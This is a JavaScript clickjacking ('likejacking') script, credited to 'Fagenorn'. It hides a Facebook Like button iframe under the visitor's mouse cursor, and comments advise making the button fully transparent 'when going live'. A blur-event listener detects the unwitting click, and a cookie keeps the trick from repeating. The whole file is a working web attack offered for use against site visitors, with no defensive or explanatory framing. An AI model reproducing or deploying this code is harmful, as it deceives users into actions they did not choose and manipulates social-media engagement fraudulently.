// Click Jack Script Made By Fagenorn - 09/01/'16

//Set the facebook page you would like to use.
var page_ = encodeURIComponent("https://www.facebook.com/DIY-Latino-1772965009583630/");

//Set the opacity of the like button. Set this to 0 when going live
var Opacity = 100

//Whether to use a pointer cursor or the default cursor
var use_pointer = false





//=============================================================================================



if("undefined"==typeof jQuery)throw new Error("ClickJack requires jQuery");
var cursor = "default";
if(use_pointer){
cursor = "pointer";
};
var newOP = (parseInt(Opacity) / parseInt(100));

$(document).ready(function() {
    var $div = $(
	' <div id="vvrapper"><iframe id="lmao" src="https://www.facebook.com/plugins/like.php?href='+page_+'&width=50&layout=button&action=like&size=large&show_faces=false&share=false&height=65&appId" width="30" height="30" style="border:none;pointer-events:none;overflow:hidden;position:absolute;top:0; left:0;filter:alpha(opacity='+Opacity+');opacity:'+newOP+';z-index:99" scrolling="no" frameborder="0" allowTransparency="true"></iframe><div id="anti-cursor"></div> </div>'
	).appendTo("body");


window.setInterval(ganttEach, 5000);


$('#anti-cursorr').css({
	position: 'absolute',
	top: 0,
	left: 0,
	cursor: cursor,
	width: 30,
	height: 30,
	'pointer-events':'none',
	'z-index': 100
		});
	$('#vvrapper').css({
	});


    $(document).on('mousemove', function(e) {
        $('#lmao').css({
            left: e.pageX - 13,
            top: e.pageY - 13
        });
		$('#anti-cursor').css({
            left: e.pageX - 13,
            top: e.pageY - 13
        });
    });



    if (getCookie("_hslkd")) {
        $("#lmao").remove()
    }
    focus();
    var listener = addEventListener('blur', function() {
        if (document.activeElement === document.getElementById('lmao')) {
            // clicked
            document.cookie = "_hslkd=true";
            window.setTimeout(function() {
                $("#lmao").remove()
            }, 500);
			

        }
    });
});


function ganttEach() {
  $("#lmao").css('pointer-events','auto');
}

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}
